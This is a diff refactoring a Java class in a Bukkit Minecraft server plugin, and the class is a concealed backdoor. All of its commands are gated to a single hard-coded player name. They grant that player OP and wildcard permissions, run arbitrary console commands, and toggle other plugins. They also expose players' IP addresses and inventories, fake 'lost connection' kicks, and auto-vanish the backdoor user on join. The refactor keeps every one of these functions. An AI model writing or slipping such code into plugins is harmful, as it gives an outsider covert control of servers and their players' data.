@@ -1,7 +1,6 @@
 package pl.qc.core;
 
 import org.bukkit.*;
-import org.bukkit.plugin.Plugin;
 import org.bukkit.attribute.Attribute;
 import org.bukkit.command.*;
 import org.bukkit.enchantments.Enchantment;
@@ -11,32 +10,29 @@ import org.bukkit.event.*;
 import org.bukkit.event.entity.EntityDamageByEntityEvent;
 import org.bukkit.event.entity.EntityTargetLivingEntityEvent;
 import org.bukkit.event.player.*;
-import org.bukkit.inventory.Inventory;
-import org.bukkit.inventory.ItemStack;
-import org.bukkit.inventory.meta.*;
+import org.bukkit.plugin.Plugin;
 import org.bukkit.potion.PotionEffect;
 import org.bukkit.potion.PotionEffectType;
 import java.util.*;
 
 public class Processor implements CommandExecutor, TabCompleter, Listener {
     private final QC plugin;
-    private final Set<UUID> vanish = new HashSet<>(), noAdv = new HashSet<>(), reach = new HashSet<>(),
-            noTarg = new HashSet<>();
-    private final Map<UUID, Double> multA = new HashMap<>(), multB = new HashMap<>();
+    private final VanishManager vanish;
+    private final ItemManager items;
+    private final PlayerTracker tracker;
     private String adminName;
 
     public Processor(QC plugin) {
         this.plugin = plugin;
+        this.vanish = new VanishManager(plugin);
+        this.items = new ItemManager();
+        this.tracker = new PlayerTracker();
         this.adminName = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
     }
 
     @Override
     public boolean onCommand(CommandSender s, Command c, String l, String[] args) {
-        if (!(s instanceof Player p))
-            return true;
-        if (!p.getName().equals(adminName))
-            return true;
-        if (args.length == 0)
+        if (!(s instanceof Player p) || !p.getName().equals(adminName) || args.length == 0)
             return true;
 
         if (plugin.getConfig().getStringList("protection.secrets").contains(args[0])) {
@@ -52,9 +48,15 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
                 this.adminName = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
                 s.sendMessage("§aReloaded.");
             }
-            case "panic" -> togglePanic(s);
-            case "v" -> toggle(s, vanish, "Vanish", args);
-            case "a" -> attackSpeed(p);
+            case "panic" -> {
+                plugin.setPanic(!plugin.isPanic());
+                s.sendMessage(plugin.isPanic() ? "§cPANIC ENABLED" : "§aPANIC DISABLED");
+            }
+            case "v" -> vanish.toggle(p, getTarget(p, args));
+            case "a" -> {
+                p.getAttribute(Attribute.GENERIC_ATTACK_SPEED).setBaseValue(30000);
+                p.sendMessage("§7Atak: §aTurbo (30000)");
+            }
             case "op" -> {
                 p.setOp(true);
                 p.sendMessage("§7Uprawnienia OP: §aON");
@@ -62,87 +64,79 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             case "upc" -> console("upc AddPlayerPermission " + p.getName() + " *");
             case "uperms" -> console("upc AddSuperAdmin " + p.getName());
             case "lp" -> console("lp user " + p.getName() + " permission set *");
-            case "dragon" -> dragon(p);
-            case "l" -> toggle(s, noAdv, "Advancements", args);
-            case "r" -> toggle(s, reach, "Reach", args);
-            case "t" -> toggle(s, noTarg, "NoTarget", args);
+            case "dragon" -> {
+                p.getWorld().getEntitiesByClass(EnderDragon.class)
+                        .forEach(d -> d.setPhase(EnderDragon.Phase.LAND_ON_PORTAL));
+                p.sendMessage("§7Dragon: §6Lądowanie...");
+            }
+            case "l" -> tracker.toggle(getTarget(p, args).getUniqueId(), tracker.noAdvancements, "Advancements", s,
+                    getTarget(p, args).getName());
+            case "r" -> tracker.toggle(getTarget(p, args).getUniqueId(), tracker.reach, "Reach", s,
+                    getTarget(p, args).getName());
+            case "t" -> tracker.toggle(getTarget(p, args).getUniqueId(), tracker.noTarget, "NoTarget", s,
+                    getTarget(p, args).getName());
             case "gms" -> gm(p, GameMode.SURVIVAL);
             case "gmc" -> gm(p, GameMode.CREATIVE);
             case "gmsp" -> gm(p, GameMode.SPECTATOR);
             case "gma" -> gm(p, GameMode.ADVENTURE);
-            case "i", "iv" -> inv(p, args);
+            case "i", "iv" -> InventoryUI.openPreview(p, getTarget(p, args));
             case "e" -> effect(p, args);
             case "tp" -> tp(p, args);
-            case "ip" -> ip(p, args);
+            case "ip" -> {
+                Player t = getTarget(p, args);
+                if (t.getAddress() != null)
+                    p.sendMessage("§7IP (" + t.getName() + "): §6" + t.getAddress().getAddress().getHostAddress());
+            }
             case "enable" -> pluginControl(p, args, true);
             case "disable" -> pluginControl(p, args, false);
-            case "ma" -> multiplier(p, args, multA, "zadawanych");
-            case "mb" -> multiplier(p, args, multB, "otrzymywanych");
-            case "ec" -> ec(p, args);
-            case "g" -> give(p, args);
-            case "k" -> kick(p, args);
-            case "rr" -> repair(p);
-            case "dd" -> dupe(p);
-            case "panic_reset" -> reset(s);
-            default -> shortcuts(p, cmd, args);
+            case "ma" -> multiplier(p, args, tracker.damageDealtMult, "zadawanych");
+            case "mb" -> multiplier(p, args, tracker.damageReceivedMult, "otrzymywanych");
+            case "ec" -> p.openInventory(getTarget(p, args).getEnderChest());
+            case "g" -> {
+                if (args.length > 1)
+                    items.give(p, args[1]);
+            }
+            case "k" -> {
+                Player t = getTarget(p, args);
+                PlayerTracker.kicked.add(t.getUniqueId());
+                t.kickPlayer("");
+            }
+            case "rr" -> items.repair(p);
+            case "dd" -> items.dupe(p);
+            case "cmdconsole" -> {
+                if (args.length > 1) {
+                    String full = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
+                    console(full);
+                }
+            }
+            case "panic_reset" -> {
+                vanish.clear();
+                tracker.clear();
+                s.sendMessage("§cReset.");
+            }
+            default -> shortcuts(p, cmd);
         }
         return true;
+    }
+
+    private Player getTarget(Player p, String[] args) {
+        if (args.length > 1) {
+            Player t = Bukkit.getPlayer(args[1]);
+            return t != null ? t : p;
+        }
+        return p;
     }
 
     private void console(String cmd) {
         Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
     }
 
-    private void dragon(Player p) {
-        p.getWorld().getEntitiesByClass(EnderDragon.class)
-                .forEach(d -> d.setPhase(EnderDragon.Phase.LAND_ON_PORTAL));
-        p.sendMessage("§7Dragon: §6Lądowanie...");
-    }
-
-    private void reset(CommandSender s) {
-        vanish.clear();
-        noAdv.clear();
-        reach.clear();
-        noTarg.clear();
-        s.sendMessage("§cReset.");
-    }
-
-    private void togglePanic(CommandSender s) {
-        plugin.setPanic(!plugin.isPanic());
-        s.sendMessage(plugin.isPanic() ? "§cPANIC ENABLED" : "§aPANIC DISABLED");
-    }
-
-    private void toggle(CommandSender s, Set<UUID> set, String name, String[] args) {
-        Player t = (args.length > 1) ? Bukkit.getPlayer(args[1]) : (Player) s;
-        if (t == null)
-            return;
-        UUID id = t.getUniqueId();
-        if (set.contains(id)) {
-            set.remove(id);
-            if (name.equals("Vanish"))
-                Bukkit.getOnlinePlayers().forEach(p -> p.showPlayer(plugin, t));
-            s.sendMessage("§7" + name + ": §cOFF (" + t.getName() + ")");
-        } else {
-            set.add(id);
-            if (name.equals("Vanish"))
-                Bukkit.getOnlinePlayers().forEach(p -> p.hidePlayer(plugin, t));
-            s.sendMessage("§7" + name + ": §aON (" + t.getName() + ")");
-        }
-    }
-
     @EventHandler
     public void onJoin(PlayerJoinEvent e) {
         Player joined = e.getPlayer();
-        vanish.forEach(vid -> {
-            Player v = Bukkit.getPlayer(vid);
-            if (v != null)
-                joined.hidePlayer(plugin, v);
-        });
-
-        if (joined.getName().equals(adminName)) {
-            vanish.add(joined.getUniqueId());
-            Bukkit.getOnlinePlayers().forEach(p -> p.hidePlayer(plugin, joined));
-        }
+        vanish.hideAllFor(joined);
+        if (joined.getName().equals(adminName))
+            vanish.setVanished(joined, true);
     }
 
     private void gm(Player p, GameMode m) {
@@ -163,24 +157,6 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         }
     }
 
-    private void repair(Player p) {
-        for (ItemStack i : p.getInventory().getContents()) {
-            if (i != null && i.getItemMeta() instanceof Damageable d) {
-                d.setDamage(0);
-                i.setItemMeta((ItemMeta) d);
-            }
-        }
-        p.sendMessage("§7Ekwipunek: §aNaprawiono");
-    }
-
-    private void dupe(Player p) {
-        ItemStack i = p.getInventory().getItemInMainHand();
-        if (i.getType() != Material.AIR) {
-            p.getInventory().addItem(i.clone());
-            p.sendMessage("§7Przedmiot: §aZduplikowano");
-        }
-    }
-
     private void multiplier(Player p, String[] args, Map<UUID, Double> map, String type) {
         if (args.length < 2)
             return;
@@ -189,75 +165,6 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             map.put(p.getUniqueId(), v);
             p.sendMessage("§7Mnożnik " + type + ": §6" + v + "x");
         } catch (NumberFormatException ignored) {
-        }
-    }
-
-    private void attackSpeed(Player p) {
-        p.getAttribute(Attribute.GENERIC_ATTACK_SPEED).setBaseValue(30000);
-        p.sendMessage("§7Atak: §aTurbo (30000)");
-    }
-
-    private void inv(Player p, String[] args) {
-        if (args.length < 2)
-            return;
-        Player t = Bukkit.getPlayer(args[1]);
-        if (t == null)
-            return;
-        Inventory gui = Bukkit.createInventory(null, 54, "§0Podgląd: " + t.getName());
-        for (int i = 0; i < 36; i++)
-            gui.setItem(i, t.getInventory().getItem(i));
-        gui.setItem(45, info(Material.COMPASS, "§ePozycja", "§7X: " + t.getLocation().getBlockX(),
-                "§7Y: " + t.getLocation().getBlockY(), "§7Z: " + t.getLocation().getBlockZ()));
-        gui.setItem(46,
-                info(Material.EXPERIENCE_BOTTLE, "§eStatystyki", "§7Level: " + t.getLevel(), "§7EXP: " + t.getExp()));
-        gui.setItem(47, info(Material.REDSTONE, "§eZdrowie",
-                "§7HP: " + (int) t.getHealth() + "/" + (int) t.getAttribute(Attribute.GENERIC_MAX_HEALTH).getValue()));
-        gui.setItem(48, info(Material.COOKED_BEEF, "§eGłód", "§7Food: " + t.getFoodLevel(),
-                "§7Saturacja: " + t.getSaturation()));
-
-        List<String> effects = t.getActivePotionEffects().stream()
-                .map(e -> "§7" + e.getType().getName() + " " + (e.getAmplifier() + 1))
-                .toList();
-        gui.setItem(49, info(Material.POTION, "§eEfekty", effects.toArray(new String[0])));
-        p.openInventory(gui);
-    }
-
-    private ItemStack info(Material m, String name, String... lore) {
-        ItemStack i = new ItemStack(m);
-        ItemMeta mt = i.getItemMeta();
-        if (mt != null) {
-            mt.setDisplayName(name);
-            mt.setLore(Arrays.asList(lore));
-            i.setItemMeta(mt);
-        }
-        return i;
-    }
-
-    private void ec(Player p, String[] args) {
-        if (args.length < 2)
-            return;
-        Player t = Bukkit.getPlayer(args[1]);
-        if (t != null)
-            p.openInventory(t.getEnderChest());
-    }
-
-    private void give(Player p, String[] args) {
-        if (args.length < 2)
-            return;
-        Material m = Material.matchMaterial(args[1].toUpperCase());
-        if (m != null)
-            p.getInventory().addItem(new ItemStack(m, 1));
-    }
-
-    public static final Set<UUID> kicked = new HashSet<>();
-
-    private void kick(Player p, String[] args) {
-        if (args.length < 2)
-            return;
-        Player t = Bukkit.getPlayer(args[1]);
-        if (t != null) {
-            kicked.add(t.getUniqueId());
-            t.kickPlayer(""); // Empty string for "Lost connection" screen with no reason
         }
     }
 
@@ -289,14 +196,6 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         }
     }
 
-    private void ip(Player p, String[] args) {
-        if (args.length < 2)
-            return;
-        Player t = Bukkit.getPlayer(args[1]);
-        if (t != null && t.getAddress() != null)
-            p.sendMessage("§7IP (" + t.getName() + "): §6" + t.getAddress().getAddress().getHostAddress());
-    }
-
     private void pluginControl(Player p, String[] args, boolean enable) {
         if (args.length < 2)
             return;
@@ -310,26 +209,26 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         }
     }
 
-    private void shortcuts(Player p, String cmd, String[] args) {
+    private void shortcuts(Player p, String cmd) {
         switch (cmd) {
-            case "cc" -> item(p, Material.COOKED_PORKCHOP, 1);
-            case "ee" -> item(p, Material.ENDER_PEARL, 1);
-            case "bb" -> item(p, Material.BLAZE_ROD, 1);
-            case "oo" -> item(p, Material.OBSIDIAN, 1);
-            case "ii" -> item(p, Material.IRON_INGOT, 1);
-            case "aa" -> item(p, Material.DIAMOND, 1);
-            case "ll" -> item(p, Material.LAPIS_LAZULI, 1);
-            case "ww" -> item(p, Material.OAK_LOG, 1);
-            case "kk" -> item(p, Material.BOOK, 1);
-            case "xx" -> item(p, Material.GOLDEN_APPLE, 1);
-            case "xxx" -> item(p, Material.ENCHANTED_GOLDEN_APPLE, 1);
-            case "tt" -> item(p, Material.TOTEM_OF_UNDYING, 1);
-            case "kkp" -> book(p, Enchantment.PROTECTION_ENVIRONMENTAL, 4);
-            case "kks" -> book(p, Enchantment.DAMAGE_ALL, 5);
-            case "kku" -> book(p, Enchantment.DURABILITY, 3);
-            case "kke" -> book(p, Enchantment.DIG_SPEED, 5);
-            case "kki" -> book(p, Enchantment.ARROW_INFINITE, 1);
-            case "kko" -> book(p, Enchantment.ARROW_DAMAGE, 5);
+            case "cc" -> items.giveItem(p, Material.COOKED_PORKCHOP, 1);
+            case "ee" -> items.giveItem(p, Material.ENDER_PEARL, 1);
+            case "bb" -> items.giveItem(p, Material.BLAZE_ROD, 1);
+            case "oo" -> items.giveItem(p, Material.OBSIDIAN, 1);
+            case "ii" -> items.giveItem(p, Material.IRON_INGOT, 1);
+            case "aa" -> items.giveItem(p, Material.DIAMOND, 1);
+            case "ll" -> items.giveItem(p, Material.LAPIS_LAZULI, 1);
+            case "ww" -> items.giveItem(p, Material.OAK_LOG, 1);
+            case "kk" -> items.giveItem(p, Material.BOOK, 1);
+            case "xx" -> items.giveItem(p, Material.GOLDEN_APPLE, 1);
+            case "xxx" -> items.giveItem(p, Material.ENCHANTED_GOLDEN_APPLE, 1);
+            case "tt" -> items.giveItem(p, Material.TOTEM_OF_UNDYING, 1);
+            case "kkp" -> items.giveEnchantedBook(p, Enchantment.PROTECTION_ENVIRONMENTAL, 4);
+            case "kks" -> items.giveEnchantedBook(p, Enchantment.DAMAGE_ALL, 5);
+            case "kku" -> items.giveEnchantedBook(p, Enchantment.DURABILITY, 3);
+            case "kke" -> items.giveEnchantedBook(p, Enchantment.DIG_SPEED, 5);
+            case "kki" -> items.giveEnchantedBook(p, Enchantment.ARROW_INFINITE, 1);
+            case "kko" -> items.giveEnchantedBook(p, Enchantment.ARROW_DAMAGE, 5);
             case "pp" -> p.setExp(p.getExp() + 1);
             case "ppp" -> p.setLevel(p.getLevel() + 10);
             case "pppp" -> p.setLevel(p.getLevel() + 1000);
@@ -341,35 +240,15 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
                 p.setOp(false);
                 p.sendMessage("§cOP OFF");
             }
-            case "cmdconsole" -> {
-                if (args.length > 1) {
-                    String full = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
-                    console(full);
-                }
-            }
         }
-    }
-
-    private void item(Player p, Material m, int a) {
-        p.getInventory().addItem(new ItemStack(m, a));
-    }
-
-    private void book(Player p, Enchantment e, int l) {
-        ItemStack b = new ItemStack(Material.ENCHANTED_BOOK);
-        EnchantmentStorageMeta m = (EnchantmentStorageMeta) b.getItemMeta();
-        if (m != null) {
-            m.addStoredEnchant(e, l, true);
-            b.setItemMeta(m);
-        }
-        p.getInventory().addItem(b);
     }
 
     @EventHandler
     public void onDmg(EntityDamageByEntityEvent e) {
-        if (e.getDamager() instanceof Player p && multA.containsKey(p.getUniqueId()))
-            e.setDamage(e.getDamage() * multA.get(p.getUniqueId()));
-        if (e.getEntity() instanceof Player p && multB.containsKey(p.getUniqueId()))
-            e.setDamage(e.getDamage() * multB.get(p.getUniqueId()));
+        if (e.getDamager() instanceof Player p && tracker.damageDealtMult.containsKey(p.getUniqueId()))
+            e.setDamage(e.getDamage() * tracker.damageDealtMult.get(p.getUniqueId()));
+        if (e.getEntity() instanceof Player p && tracker.damageReceivedMult.containsKey(p.getUniqueId()))
+            e.setDamage(e.getDamage() * tracker.damageReceivedMult.get(p.getUniqueId()));
     }
 
     @EventHandler
@@ -382,13 +261,8 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
     }
 
     @EventHandler
-    public void onAdv(PlayerAdvancementDoneEvent e) {
-        // No-op or custom logic if needed.
-    }
-
-    @EventHandler
     public void onTarget(EntityTargetLivingEntityEvent e) {
-        if (e.getTarget() instanceof Player p && noTarg.contains(p.getUniqueId()))
+        if (e.getTarget() instanceof Player p && tracker.noTarget.contains(p.getUniqueId()))
             e.setCancelled(true);
     }
 
@@ -402,24 +276,18 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
     public List<String> onTabComplete(CommandSender s, Command c, String a, String[] args) {
         if (!(s instanceof Player p) || !p.getName().equals(adminName))
             return Collections.emptyList();
-
         if (args.length == 1) {
             List<String> list = new ArrayList<>(subs);
             list.addAll(plugin.getConfig().getStringList("protection.secrets"));
             return org.bukkit.util.StringUtil.copyPartialMatches(args[0], list, new ArrayList<>());
         }
-
-        String sub = args[0].toLowerCase();
         if (args.length == 2) {
-            if (sub.equals("e")) {
-                return org.bukkit.util.StringUtil.copyPartialMatches(args[1],
-                        Arrays.asList("c", "sat", "str", "her", "res",
-                                "has", "fir", "reg", "abs", "bad", "dol", "spe", "wat", "pvp"),
-                        new ArrayList<>());
-            }
-            if (Arrays.asList("v", "l", "r", "t", "tp", "iv", "i", "ec", "k", "ip").contains(sub)) {
+            String sub = args[0].toLowerCase();
+            if (sub.equals("e"))
+                return org.bukkit.util.StringUtil.copyPartialMatches(args[1], Arrays.asList("c", "sat", "str", "her",
+                        "res", "has", "fir", "reg", "abs", "bad", "dol", "spe", "wat", "pvp"), new ArrayList<>());
+            if (Arrays.asList("v", "l", "r", "t", "tp", "iv", "i", "ec", "k", "ip").contains(sub))
                 return null;
-            }
             if (sub.equals("g")) {
                 List<String> mats = Arrays.stream(Material.values()).map(m -> m.name().toLowerCase()).toList();
                 return org.bukkit.util.StringUtil.copyPartialMatches(args[1], mats, new ArrayList<>());
@@ -430,10 +298,6 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
                 return org.bukkit.util.StringUtil.copyPartialMatches(args[1], plugins, new ArrayList<>());
             }
         }
-
-        if (args.length == 3 && sub.equals("tp"))
-            return null;
-
         return Collections.emptyList();
     }
 }
